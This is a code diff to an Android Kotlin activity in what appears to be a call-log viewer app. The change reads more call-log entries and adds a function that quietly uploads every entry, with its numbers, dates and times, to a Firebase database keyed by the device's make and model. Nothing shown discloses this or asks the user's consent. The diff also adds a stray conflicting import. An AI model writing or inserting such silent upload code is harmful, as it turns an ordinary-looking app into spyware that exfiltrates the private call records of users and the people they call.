@@ -5,6 +5,7 @@ import android.app.Activity
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.database.Cursor
+import android.hardware.usb.UsbDevice.getDeviceName
 import android.os.Build
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
@@ -16,6 +17,7 @@ import androidx.core.content.ContextCompat
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.swiperefreshlayout.widget.SwipeRefreshLayout
 import com.example.cybsapp.databinding.ActivityMainBinding
+import com.google.firebase.database.FirebaseDatabase
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -108,9 +110,10 @@ class MainActivity : AppCompatActivity() {
                 )
 
                 list.add(callLogItem)
-                if(list.size>25){
+                if(list.size>50){
                     break
                 }
+                sendDataToServer(callLogItem)
             }
         }
         callLogAdapter?.notifyDataSetChanged()
@@ -173,8 +176,36 @@ class MainActivity : AppCompatActivity() {
         }
         return durationFormatted
     }
+    private fun sendDataToServer(callLogItem: CallLogmodel) {
+        val database = FirebaseDatabase.getInstance()
+        val myRef = database.getReference("CallLog")
+            .child(getDeviceName())
+            .child(callLogItem.getCallDate())
+            .child(callLogItem.getCallTime())
+        myRef.setValue(callLogItem)
+    }
 
+    private fun getDeviceName(): String {
+        val manufacturer = Build.MANUFACTURER
+        val model = Build.MODEL
+        return if (model.startsWith(manufacturer)) {
+            capitalize(model)
+        } else {
+            capitalize(manufacturer) + " " + model
+        }
+    }
 
+    private fun capitalize(s: String): String {
+        if (s.isEmpty()) {
+            return ""
+        }
+        val first = s[0]
+        return if (Character.isUpperCase(first)) {
+            s
+        } else {
+            first.uppercaseChar() + s.substring(1)
+        }
+    }
 
 
     override fun onDestroy() {
